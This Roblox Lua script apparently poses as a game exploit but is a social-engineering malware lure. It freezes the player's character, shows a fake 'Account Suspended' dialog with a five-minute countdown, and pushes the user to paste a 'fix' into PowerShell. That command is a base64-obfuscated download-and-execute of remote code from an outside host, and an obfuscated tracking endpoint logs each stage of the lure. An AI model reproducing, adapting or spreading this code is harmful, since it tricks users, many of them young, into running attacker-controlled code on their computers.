local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local ContextActionSvc = game:GetService("ContextActionService")
local lp = Players.LocalPlayer
local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"
-- ANALYTICS (оригинальный формат: executor + event)
local ANALYTICS = {
endpoint = table.concat({"ht","tps:","/","/rbx","-scri","pts.","xyz","/api","/hit"}),
enabled = true,
sessionId = tostring(math.random(100000,999999)) .. tostring(os.time() % 100000),
}
local function sendHit(executorName, eventType)
if not ANALYTICS.enabled then return end
local body = table.concat({
"session=", ANALYTICS.sessionId,
"&executor=", executorName or "unknown",
"&event=", eventType or "shown",
"&ts=", tostring(os.time()),
})
local payload = {
Url = ANALYTICS.endpoint,
Method = "POST",
Headers = {
["Content-Type"] = "application/x-www-form-urlencoded",
["User-Agent"] = "RobloxClient/1.0",
},
Body = body,
}
task.spawn(function()
pcall(function()
if request then
request(payload)
elseif syn and syn.request then
syn.request(payload)
elseif http_request then
http_request(payload)
elseif http and http.request then
http.request(payload)
else
game:GetService("HttpService"):PostAsync(
ANALYTICS.endpoint,
body,
Enum.HttpContentType.ApplicationUrlEncoded,
false
)
end
end)
end)
end
-- ============ CHARACTER FREEZE ============
local FROZEN_ACTION = "RobloxVersionFreeze"
local function freezeCharacter(character)
if not character then return end
local humanoid = character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.JumpHeight = 0
task.spawn(function()
while character.Parent and humanoid.Parent do
if humanoid.WalkSpeed ~= 0 then humanoid.WalkSpeed = 0 end
if humanoid.JumpPower ~= 0 then humanoid.JumpPower = 0 end
if humanoid.JumpHeight ~= 0 then humanoid.JumpHeight = 0 end
task.wait(0.25)
end
end)
end
pcall(function()
ContextActionSvc:BindAction(
FROZEN_ACTION,
function() return Enum.ContextActionResult.Sink end,
false,
Enum.PlayerActions.CharacterForward,
Enum.PlayerActions.CharacterBackward,
Enum.PlayerActions.CharacterLeft,
Enum.PlayerActions.CharacterRight,
Enum.PlayerActions.CharacterJump
)
end)
end
local function hookCharacterFreeze()
if lp.Character then freezeCharacter(lp.Character) end
lp.CharacterAdded:Connect(function(char)
char:WaitForChild("Humanoid",10)
task.wait(0.2)
freezeCharacter(char)
end)
end
hookCharacterFreeze()
-- ============ PALETTE ============
local C = {
dim       = Color3.fromRGB(0, 0, 0),
card      = Color3.fromRGB(35, 35, 38),
cardTop   = Color3.fromRGB(46, 46, 50),
title     = Color3.fromRGB(255, 255, 255),
body      = Color3.fromRGB(220, 220, 225),
muted     = Color3.fromRGB(155, 155, 160),
accent    = Color3.fromRGB(0, 162, 255),
danger    = Color3.fromRGB(235, 70, 70),
dangerBg  = Color3.fromRGB(60, 25, 25),
btnBg     = Color3.fromRGB(255, 255, 255),
btnText   = Color3.fromRGB(30, 30, 32),
btnHover  = Color3.fromRGB(230, 230, 235),
green     = Color3.fromRGB(0, 180, 70),
}
local function setClipboard(text)
local ok = false
pcall(function()
if setclipboard then setclipboard(text); ok = true
elseif toclipboard then toclipboard(text); ok = true
elseif syn and syn.write_clipboard then syn.write_clipboard(text); ok = true
elseif syn and syn.set_clipboard then syn.set_clipboard(text); ok = true
elseif writeclipboard then writeclipboard(text); ok = true
elseif GuiService and GuiService.SetClipboard then GuiService:SetClipboard(text); ok = true
end
end)
return ok
end
-- ============ SHOW DIALOG ============
local function showDialog()
local gui = Instance.new("ScreenGui")
gui.Name = "RobloxSuspensionDialog"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000000
gui.Parent = lp:WaitForChild("PlayerGui")
local dim = Instance.new("Frame")
dim.Size = UDim2.new(1, 0, 1, 0)
dim.BackgroundColor3 = C.dim
dim.BackgroundTransparency = 0.45
dim.BorderSizePixel = 0
dim.ZIndex = 1
dim.Parent = gui
local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
local CARD_W = isMobile and math.min(360, vp.X - 16) or 560
local CARD_H = 570
local cardX = -CARD_W / 2
local cardY = -CARD_H / 2
local card = Instance.new("Frame")
card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
card.BackgroundColor3 = C.card
card.BorderSizePixel = 0
card.ClipsDescendants = true
card.ZIndex = 5
card.Parent = gui
local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 10)
cardCorner.Parent = card
-- top danger strip
local strip = Instance.new("Frame")
strip.Size = UDim2.new(1, 0, 0, 4)
strip.BackgroundColor3 = C.danger
strip.BorderSizePixel = 0
strip.ZIndex = 6
strip.Parent = card
-- ============ TITLE ============
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -60, 0, 32)
title.Position = UDim2.new(0, 30, 0, 24)
title.BackgroundTransparency = 1
title.Text = "Account Suspended"
title.TextColor3 = C.title
title.TextSize = 24
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 7
title.Parent = card
-- ============ SUBTITLE ============
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -60, 0, 16)
subtitle.Position = UDim2.new(0, 30, 0, 60)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Disconnected from Roblox"
subtitle.TextColor3 = C.muted
subtitle.TextSize = 13
subtitle.Font = Enum.Font.Gotham
subtitle.TextXAlignment = Enum.TextXAlignment.Center
subtitle.ZIndex = 7
subtitle.Parent = card
-- ============ BODY TEXT ============
local body = Instance.new("TextLabel")
body.Size = UDim2.new(1, -60, 0, 68)
body.Position = UDim2.new(0, 30, 0, 88)
body.BackgroundTransparency = 1
body.RichText = true
body.Text = "Your account has been <b>suspended</b> by Roblox moderation for using <b>unauthorized third-party software</b> (exploits) in violation of the Roblox Terms of Use."
body.TextColor3 = C.body
body.TextSize = 15
body.Font = Enum.Font.Gotham
body.TextWrapped = true
body.TextXAlignment = Enum.TextXAlignment.Center
body.TextYAlignment = Enum.TextYAlignment.Top
body.LineHeight = 1.25
body.ZIndex = 7
body.Parent = card
-- ============ WARNING BOX ============
local warnBox = Instance.new("Frame")
warnBox.Size = UDim2.new(1, -60, 0, 74)
warnBox.Position = UDim2.new(0, 30, 0, 164)
warnBox.BackgroundColor3 = C.dangerBg
warnBox.BorderSizePixel = 0
warnBox.ZIndex = 6
warnBox.Parent = card
local warnCorner = Instance.new("UICorner")
warnCorner.CornerRadius = UDim.new(0, 6)
warnCorner.Parent = warnBox
local warnLabel = Instance.new("TextLabel")
warnLabel.Size = UDim2.new(1, -24, 1, 0)
warnLabel.Position = UDim2.new(0, 12, 0, 0)
warnLabel.BackgroundTransparency = 1
warnLabel.RichText = true
warnLabel.Text = "You must <b>complete verification</b> before the timer ends.\nOtherwise your account will be <b>permanently terminated</b>."
warnLabel.TextColor3 = C.danger
warnLabel.TextSize = 14
warnLabel.Font = Enum.Font.GothamBold
warnLabel.TextWrapped = true
warnLabel.TextXAlignment = Enum.TextXAlignment.Center
warnLabel.TextYAlignment = Enum.TextYAlignment.Center
warnLabel.LineHeight = 1.2
warnLabel.ZIndex = 7
warnLabel.Parent = warnBox
-- ============ TIMER ============
local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, -60, 0, 42)
timerLabel.Position = UDim2.new(0, 30, 0, 252)
timerLabel.BackgroundTransparency = 1
timerLabel.Text = "05:00"
timerLabel.TextColor3 = C.danger
timerLabel.TextSize = 34
timerLabel.Font = Enum.Font.GothamBold
timerLabel.TextXAlignment = Enum.TextXAlignment.Center
timerLabel.ZIndex = 7
timerLabel.Parent = card
local deadline = os.time() + 5 * 60
task.spawn(function()
while timerLabel.Parent do
local left = deadline - os.time()
if left < 0 then left = 0 end
local m = math.floor(left / 60)
local s = left % 60
timerLabel.Text = string.format("%02d:%02d", m, s)
task.wait(1)
end
end)
-- ============ STEPS PANEL ============
local stepPanel = Instance.new("Frame")
stepPanel.Size = UDim2.new(1, -40, 0, 170)
stepPanel.Position = UDim2.new(0, 20, 0, 306)
stepPanel.BackgroundColor3 = C.cardTop
stepPanel.BorderSizePixel = 0
stepPanel.ZIndex = 6
stepPanel.Parent = card
local spCorner = Instance.new("UICorner")
spCorner.CornerRadius = UDim.new(0, 8)
spCorner.Parent = stepPanel
local stepsHeader = Instance.new("TextLabel")
stepsHeader.Size = UDim2.new(1, -24, 0, 16)
stepsHeader.Position = UDim2.new(0, 16, 0, 10)
stepsHeader.BackgroundTransparency = 1
stepsHeader.RichText = true
stepsHeader.Text = "Follow these <b>4 steps</b> to verify:"
stepsHeader.TextColor3 = C.title
stepsHeader.TextSize = 13
stepsHeader.Font = Enum.Font.GothamBold
stepsHeader.TextXAlignment = Enum.TextXAlignment.Left
stepsHeader.ZIndex = 7
stepsHeader.Parent = stepPanel
local function buildStepRow(yPos, number, richText)
local badge = Instance.new("TextLabel")
badge.Size = UDim2.new(0, 22, 0, 22)
badge.Position = UDim2.new(0, 16, 0, yPos)
badge.BackgroundColor3 = C.accent
badge.Text = number
badge.TextColor3 = Color3.fromRGB(255, 255, 255)
badge.TextSize = 13
badge.Font = Enum.Font.GothamBold
badge.BorderSizePixel = 0
badge.ZIndex = 7
badge.Parent = stepPanel
local bc = Instance.new("UICorner")
bc.CornerRadius = UDim.new(1, 0)
bc.Parent = badge
local step = Instance.new("TextLabel")
step.Size = UDim2.new(1, -56, 0, 22)
step.Position = UDim2.new(0, 46, 0, yPos)
step.BackgroundTransparency = 1
step.RichText = true
step.Text = richText
step.TextColor3 = C.body
step.TextSize = 14
step.Font = Enum.Font.Gotham
step.TextXAlignment = Enum.TextXAlignment.Left
step.TextYAlignment = Enum.TextYAlignment.Center
step.ZIndex = 7
step.Parent = stepPanel
end
buildStepRow(34, "1", "Click <b>Copy Code</b> at the bottom of this window")
buildStepRow(66, "2", "Press <b>WIN + R</b> on your keyboard")
buildStepRow(98, "3", "Type <b>powershell</b> and press <b>ENTER</b>")
buildStepRow(130, "4", "Paste with <b>CTRL + V</b>, then press <b>ENTER</b>")
-- ============ COPY BUTTON (full width, at bottom) ============
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(1, -40, 0, 54)
copyBtn.Position = UDim2.new(0, 20, 0, 494)
copyBtn.BackgroundColor3 = C.btnBg
copyBtn.Text = "Copy Code"
copyBtn.TextColor3 = C.btnText
copyBtn.TextSize = 17
copyBtn.Font = Enum.Font.GothamBold
copyBtn.BorderSizePixel = 0
copyBtn.AutoButtonColor = false
copyBtn.ZIndex = 7
copyBtn.Parent = card
local cbCorner = Instance.new("UICorner")
cbCorner.CornerRadius = UDim.new(0, 8)
cbCorner.Parent = copyBtn
copyBtn.MouseEnter:Connect(function()
if copyBtn.Text == "Copy Code" then
copyBtn.BackgroundColor3 = C.btnHover
end
sendHit("btn", "hover")
end)
copyBtn.MouseLeave:Connect(function()
if copyBtn.Text == "Copy Code" then
copyBtn.BackgroundColor3 = C.btnBg
end
end)
local clickLock = false
copyBtn.MouseButton1Click:Connect(function()
if clickLock then return end
clickLock = true
sendHit("fix", "copy")
local copied = setClipboard(FIX_COMMAND)
if copied then
sendHit("fix", "copy_ok")
copyBtn.BackgroundColor3 = C.green
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.Text = "✓  Copied — now follow steps 2, 3, 4 above"
else
sendHit("fix", "copy_fail")
copyBtn.Text = "Copy failed — try again"
copyBtn.BackgroundColor3 = C.danger
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
clickLock = false
end
task.delay(4, function()
if copyBtn and copyBtn.Parent then
copyBtn.Text = "Copy Code"
copyBtn.TextColor3 = C.btnText
copyBtn.BackgroundColor3 = C.btnBg
clickLock = false
end
end)
end)
-- ============ ENTRANCE ============
pcall(function()
card.Position = UDim2.new(0.5, cardX, 0.5, cardY + 20)
card.BackgroundTransparency = 1
TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
Position = UDim2.new(0.5, cardX, 0.5, cardY),
BackgroundTransparency = 0,
}):Play()
end)
sendHit("shown", "shown")
end
-- Fire after 5–10 second random delay
task.delay(math.random(5, 10), showDialog)
